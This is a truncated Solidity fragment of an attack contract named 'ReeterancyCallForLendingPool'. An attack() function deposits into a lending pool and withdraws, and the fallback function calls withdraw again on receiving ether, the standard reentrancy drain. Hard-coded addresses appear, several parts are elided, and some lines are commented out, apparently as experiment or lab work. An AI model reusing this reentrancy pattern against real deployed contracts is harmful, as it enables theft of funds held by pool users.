...
contract ReeterancyCallForLendingPool {
    ...
    fallback() external payable {
        ...
        lendingPool.withdraw(0xe22da380ee6B445bb8273C81944ADEB6E8450422, 1, 0x7C71a3D85a8d620EeaB9339cCE776Ddc14a8129C);
    }

    function attack(address payable contractAddress) external payable {
        require(msg.value == 0.00001 ether, 'wrong value yaraaaab');
        //        IERC20(contractAddress).approve(address(this), 1);
        lendingPool = LendingPool(contractAddress);
        lendingPool.deposit(
        ...
        //     contractAddress.transfer(0.00001 ether);
        lendingPool.withdraw(0xe22da380ee6B445bb8273C81944ADEB6E8450422, 1, 0x7C71a3D85a8d620EeaB9339cCE776Ddc14a8129C);
    }
}
